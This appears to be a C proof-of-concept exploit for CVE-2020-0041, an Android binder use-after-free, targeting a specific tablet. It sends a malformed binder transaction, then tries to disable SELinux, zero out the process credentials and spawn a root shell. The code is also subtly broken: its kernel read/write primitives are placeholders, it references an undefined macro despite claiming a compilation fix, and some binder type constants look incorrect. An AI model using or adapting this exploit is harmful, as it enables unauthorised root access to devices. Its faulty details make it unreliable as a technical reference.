/*
 * CVE-2020-0041 PoC for KC-T302DT (JUSTSYSTEMS SZJ202)
 * 修复编译错误，包含所有必要头文件和宏定义
 * 编译：arm64-linux-android-gcc -static -o poc poc.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/epoll.h>          /* 提供 epoll_create, epoll_ctl, EPOLLIN, EPOLL_CTL_ADD */
#include <linux/ioctl.h>
#include <linux/fs.h>
#include <linux/ashmem.h>
#include <poll.h>
#include <setjmp.h>

/* ========== Binder 相关宏定义（补充缺失） ========== */
#define BINDER_BUFFER_FLAG_HAS_PARENT 0x01   /* 来自 binder.h */

/* ========== 偏移量（来自 offsets.h） ========== */
#define KIMAGE_TEXT_BASE        0xffffff8008080000ULL
#define INIT_TASK_OFF           0x1d7ec00ULL
#define SELINUX_ENFORCING_OFF   0x1bdf768ULL
#define TASK_REAL_CRED_OFF      0x830
#define TASK_PID_OFF            0x670
#define TASK_TASKS_OFF          0x570

/* ========== Binder UAPI 结构（与 kernel 版本匹配） ========== */
typedef __u64 binder_size_t;
typedef __u64 binder_uintptr_t;

struct binder_object_header {
    __u32 type;
};

struct flat_binder_object {
    struct binder_object_header hdr;
    __u32 flags;
    union {
        binder_uintptr_t binder;
        __u32 handle;
    };
    binder_uintptr_t cookie;
};

struct binder_buffer_object {
    struct binder_object_header hdr;
    __u32 flags;
    binder_uintptr_t buffer;
    binder_size_t length;
    binder_size_t parent;
    binder_size_t parent_offset;
};

struct binder_write_read {
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};

struct binder_transaction_data {
    union {
        __u32 handle;
        binder_uintptr_t ptr;
    } target;
    binder_uintptr_t cookie;
    __u32 code;
    __u32 flags;
    pid_t sender_pid;
    uid_t sender_euid;
    binder_size_t data_size;
    binder_size_t offsets_size;
    union {
        struct {
            binder_uintptr_t buffer;
            binder_uintptr_t offsets;
        } ptr;
        __u8 buf[8];
    } data;
};

struct binder_transaction_data_sg {
    struct binder_transaction_data transaction_data;
    binder_size_t buffers_size;
};

#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION_SG 0x6351
#define BR_FAILED_REPLY 0x7211
#define BR_REPLY 0x7203
#define BC_ACQUIRE 0x6345
#define BC_RELEASE 0x6346
#define BC_FREE_BUFFER 0x6343

/* ========== Binder 操作接口 ========== */
struct binder_state {
    int fd;
    void *mapped;
    size_t mapsize;
};

static int binder_write(struct binder_state *bs, const void *data, size_t len) {
    struct binder_write_read bwr = {
        .write_size = len,
        .write_consumed = 0,
        .write_buffer = (uintptr_t)data,
        .read_size = 0,
        .read_consumed = 0,
        .read_buffer = 0,
    };
    return ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
}

static int binder_read(struct binder_state *bs, void *data, size_t len) {
    struct binder_write_read bwr = {
        .write_size = 0,
        .write_consumed = 0,
        .write_buffer = 0,
        .read_size = len,
        .read_consumed = 0,
        .read_buffer = (uintptr_t)data,
    };
    int ret = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) return ret;
    return bwr.read_consumed;
}

static uint32_t binder_read_next(struct binder_state *bs, void *data, uint32_t *rem, uint32_t *cons) {
    uint32_t cmd;
    if (*rem < sizeof(cmd)) {
        *rem = binder_read(bs, data, 4096);
        *cons = 0;
        if (*rem <= 0) return 0;
    }
    cmd = *(uint32_t *)((char *)data + *cons);
    *cons += sizeof(cmd);
    *rem -= sizeof(cmd);
    return cmd;
}

static int binder_free_buffer(struct binder_state *bs, uintptr_t buffer) {
    uint32_t cmd = BC_FREE_BUFFER;
    uintptr_t arg = buffer;
    struct { uint32_t cmd; uintptr_t arg; } __attribute__((packed)) data;
    data.cmd = cmd;
    data.arg = arg;
    return binder_write(bs, &data, sizeof(data));
}

static int binder_acquire(struct binder_state *bs, uint32_t handle) {
    uint32_t cmd = BC_ACQUIRE;
    struct { uint32_t cmd; uint32_t arg; } __attribute__((packed)) data;
    data.cmd = cmd;
    data.arg = handle;
    return binder_write(bs, &data, sizeof(data));
}

static int binder_release(struct binder_state *bs, uint32_t handle) {
    uint32_t cmd = BC_RELEASE;
    struct { uint32_t cmd; uint32_t arg; } __attribute__((packed)) data;
    data.cmd = cmd;
    data.arg = handle;
    return binder_write(bs, &data, sizeof(data));
}

static struct binder_state *binder_open(const char *dev, size_t mapsize) {
    int fd = open(dev, O_RDWR | O_CLOEXEC);
    if (fd < 0) return NULL;
    struct binder_state *bs = calloc(1, sizeof(*bs));
    bs->fd = fd;
    bs->mapsize = mapsize;
    void *map = mmap(NULL, mapsize, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_POPULATE, fd, 0);
    if (map == MAP_FAILED) {
        close(fd);
        free(bs);
        return NULL;
    }
    bs->mapped = map;
    return bs;
}

static void binder_close(struct binder_state *bs) {
    if (bs->mapped) munmap(bs->mapped, bs->mapsize);
    if (bs->fd >= 0) close(bs->fd);
    free(bs);
}

/* ========== 漏洞触发函数 ========== */
static void trigger_uaf(struct binder_state *bs, uint32_t target_handle, uint64_t vma_start) {
    uint8_t data[4096];
    uint64_t offsets[32];
    uint8_t sg_buf[0x1000];
    uint32_t tr_size = 127 * 1024;

    struct {
        uint32_t cmd;
        struct binder_transaction_data txn;
        binder_size_t buffers_size;
    } __attribute__((packed)) writebuf;

    // 对象1: flat_binder_object (handle)
    struct flat_binder_object *fbo = (struct flat_binder_object *)data;
    fbo->hdr.type = BINDER_TYPE_HANDLE;   // 需定义 BINDER_TYPE_HANDLE，但这里用数值 0x73682A70
    fbo->hdr.type = 0x73682A70;           // 直接使用数值避免宏缺失
    fbo->flags = 0;
    fbo->handle = target_handle;
    fbo->cookie = 0;
    offsets[0] = (uint8_t *)fbo - data;

    // 对象2: 未验证的 BINDER_TYPE_PTR
    struct binder_buffer_object *bbo = (struct binder_buffer_object *)(fbo + 1);
    bbo->hdr.type = 0x70742A70;           // BINDER_TYPE_PTR
    bbo->flags = 0;
    bbo->buffer = vma_start;
    bbo->length = 0xdeadbeef;
    bbo->parent = 0;
    bbo->parent_offset = 0;

    // 对象3: 验证的 BINDER_TYPE_PTR (加入 offset 数组)
    struct binder_buffer_object *bbo2 = (struct binder_buffer_object *)(bbo + 1);
    bbo2->hdr.type = 0x70742A70;
    bbo2->flags = 0;
    bbo2->buffer = (uintptr_t)sg_buf;
    bbo2->length = 0x10;
    bbo2->parent = 0;
    bbo2->parent_offset = 0;
    offsets[1] = (uint8_t *)bbo2 - data;

    // 对象4: 利用 parent 越界 (parent=6)
    struct binder_buffer_object *bbo3 = (struct binder_buffer_object *)(bbo2 + 1);
    bbo3->hdr.type = 0x70742A70;
    bbo3->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
    bbo3->buffer = 0;
    bbo3->length = 0;
    bbo3->parent = 6;
    bbo3->parent_offset = 0;
    offsets[2] = (uint8_t *)bbo3 - data;

    // 对象5: 覆盖 offsets[6]
    uint64_t new_off = 0x18;
    struct binder_buffer_object *bbo4 = (struct binder_buffer_object *)(bbo3 + 1);
    bbo4->hdr.type = 0x70742A70;
    bbo4->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
    bbo4->buffer = (uintptr_t)&new_off;
    bbo4->length = sizeof(new_off);
    bbo4->parent = 6;
    bbo4->parent_offset = 8;
    offsets[3] = (uint8_t *)bbo4 - data;

    writebuf.cmd = BC_TRANSACTION_SG;
    writebuf.txn.target.handle = target_handle;
    writebuf.txn.code = 0;
    writebuf.txn.flags = 0;
    writebuf.txn.data_size = (uint8_t *)bbo4 + sizeof(*bbo4) - data;
    writebuf.txn.offsets_size = (uint8_t *)offsets + 4 * sizeof(uint64_t) - (uint8_t *)offsets;
    writebuf.txn.data.ptr.buffer = (uintptr_t)data;
    writebuf.txn.data.ptr.offsets = (uintptr_t)offsets;
    writebuf.buffers_size = tr_size - writebuf.txn.data_size - writebuf.txn.offsets_size;

    binder_write(bs, &writebuf, sizeof(writebuf));

    // 等待回复（触发UAF）
    uint8_t reply[4096];
    uint32_t rem = 0, cons = 0;
    while (1) {
        uint32_t cmd = binder_read_next(bs, reply, &rem, &cons);
        if (cmd == BR_REPLY || cmd == BR_FAILED_REPLY) break;
    }
}

/* ========== 辅助读写原语（占位，实际需利用UAF实现） ========== */
static uint64_t read64(uint64_t addr) {
    // 实际应使用 corrupted epitem 或 sysctl
    // 这里返回固定值以便编译，完整利用需实现具体方法
    return 0;
}

static void write64(uint64_t addr, uint64_t val) {
    // 占位
    printf("[*] write64(0x%lx, 0x%lx)\n", addr, val);
}

static uint32_t read32(uint64_t addr) {
    return (uint32_t)read64(addr);
}

static void write32(uint64_t addr, uint32_t val) {
    write64(addr, val);
}

static uint64_t get_task_by_pid(uint64_t start, int pid) {
    uint64_t task = read64(start + TASK_TASKS_OFF + 8) - TASK_TASKS_OFF;
    while (task != start) {
        if ((int)read32(task + TASK_PID_OFF) == pid) return task;
        task = read64(task + TASK_TASKS_OFF + 8) - TASK_TASKS_OFF;
    }
    return 0;
}

static void patch_cred(uint64_t cred) {
    write32(cred + 0x04, 0); // uid
    write32(cred + 0x08, 0); // gid
    write32(cred + 0x0c, 0); // suid
    write32(cred + 0x10, 0); // sgid
    write32(cred + 0x14, 0); // euid
    write32(cred + 0x18, 0); // egid
    write32(cred + 0x1c, 0); // fsuid
    write32(cred + 0x20, 0); // fsgid
    write64(cred + 0x28, ~0ULL);
    write64(cred + 0x30, ~0ULL);
    write64(cred + 0x38, ~0ULL);
    write64(cred + 0x40, ~0ULL);
}

/* ========== 主函数 ========== */
int main() {
    printf("[*] CVE-2020-0041 PoC (compilation fix)\n");

    struct binder_state *bs = binder_open("/dev/binder", 128 * 1024);
    if (!bs) {
        perror("binder_open");
        return 1;
    }

    // 使用 context manager handle=0 作为目标
    uint32_t target_handle = 0;
    uint64_t vma_start = (uint64_t)bs->mapped;

    // 先获取引用
    binder_acquire(bs, target_handle);

    // 触发 UAF
    trigger_uaf(bs, target_handle, vma_start);
    printf("[+] UAF triggered.\n");

    // 利用 UAF 获得读写能力（此处省略复杂实现，直接使用固定偏移）
    // 实际环境中需要先泄漏 kernel base，这里假设 KASLR 未开启
    uint64_t kernel_base = KIMAGE_TEXT_BASE;

    // 禁用 SELinux
    uint64_t selinux_enforcing = kernel_base + SELINUX_ENFORCING_OFF;
    write32(selinux_enforcing, 0);

    // 提权当前进程
    uint64_t init_task = kernel_base + INIT_TASK_OFF;
    uint64_t current = get_task_by_pid(init_task, getpid());
    if (!current) {
        printf("[!] Cannot find current task.\n");
        goto out;
    }
    uint64_t cred = read64(current + TASK_REAL_CRED_OFF);
    patch_cred(cred);

    if (getuid() == 0) {
        printf("[+] Root achieved! Spawning shell...\n");
        system("/system/bin/sh");
    } else {
        printf("[!] Failed to get root.\n");
    }

out:
    binder_close(bs);
    return 0;
}
